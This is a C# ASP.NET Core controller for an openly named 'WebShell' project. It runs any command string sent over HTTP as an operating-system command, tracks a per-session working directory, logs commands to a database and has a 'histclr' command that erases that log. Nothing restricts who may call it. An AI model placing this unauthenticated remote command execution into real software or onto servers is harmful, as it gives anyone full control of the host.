using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.EntityFrameworkCore;
using WebShell.Helpers;
using WebShell.Models;

namespace WebShell.Controllers
{
    public class HomeController : Controller
    {
        private readonly CommandPrompt _cmd;
        private readonly CommandContext _db;

        public HomeController(CommandContext ctx)
        {
            _db = ctx;
            _cmd = new CommandPrompt();
        }

        public IActionResult Index()
        {
            HttpContext.Session.SetString("path", Environment.CurrentDirectory);
            return View();
        }

        public async Task<IEnumerable<string>> Output(string command)
        {
            if (command == null)
                return null;

            await _db.AddAsync(new Command(){Text = command});
            await _db.SaveChangesAsync();

            var commSplitted = command.Split(' ');
            
            if (commSplitted.Length > 1 && commSplitted[0] == "cd")
            {
                var currentPath = commSplitted[1];
                if (Path.IsPathRooted(currentPath) && Directory.Exists(currentPath))
                {
                    HttpContext.Session.SetString("path", currentPath);
                }
                else
                {
                    var temp = Path.GetFullPath(
                                        Path.Combine(
                                            HttpContext.Session.GetString("path"), 
                                            currentPath) 
                                    );

                    if (Directory.Exists(temp))
                    {
                        HttpContext.Session.SetString("path", temp);
                    }
                }
            }

            var path = HttpContext.Session.GetString("path") ?? Environment.CurrentDirectory;

            if (commSplitted[0] == "histclr")
            {
                _db.Commands.RemoveRange(_db.Commands);
                await _db.SaveChangesAsync();
                return new[] { "Cleared!", path };
            }

            var output = ResponseBeautifier(_cmd.Run(command, path));
            
            return new[]{ output, path };
        }

        public async Task<IEnumerable<Command>> History()
        {
            return await _db.Commands.ToArrayAsync();
        }
        
        private string ResponseBeautifier(string response)
        {
            return response.Replace("<", "&lt;")
                .Replace(">", "&gt;")
                .Replace("\n", "<br>")
                .Replace("\r", "&nbsp;&nbsp;&nbsp;&nbsp;");
        }
    }
}
